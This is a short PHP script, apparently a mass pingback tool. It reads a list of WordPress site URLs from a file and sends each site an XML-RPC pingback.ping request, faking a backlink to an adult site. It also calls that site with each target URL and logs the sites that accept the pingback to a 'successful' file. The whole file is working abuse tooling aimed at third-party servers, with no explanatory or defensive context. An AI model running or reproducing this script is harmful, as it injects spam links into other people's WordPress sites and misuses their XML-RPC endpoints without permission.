<?php

set_time_limit(0);

$dosya=file_get_contents("site.txt");


foreach(explode("\n", $dosya) as $line) {

$line=trim($line);
file_get_contents("http://hikayeliporno.net/index.php?getir=".$line);
$parse = parse_url($line);
$hostx=$parse['host'];


$request = xmlrpc_encode_request("pingback.ping", array("http://hikayeliporno.net/", trim($line)));
    $context = stream_context_create(array('http' => array(
        'method' => "POST",
        'header' => "Content-Type: text/xml charset=utf-8",
        'content' => $request
    )));
    $file = file_get_contents("http://".$hostx."/xmlrpc.php", false, $context);
    echo $file;
    $response = xmlrpc_decode($file);
    if ($response && xmlrpc_is_fault($response)) {
        trigger_error("xmlrpc: $response[faultString] ($response[faultCode])");
    } else {
       if(stristr($response,":-)")) {
                fwrite(fopen("basarili.txt","a+"),$line."\n");
           }
    }

        }


        ?>
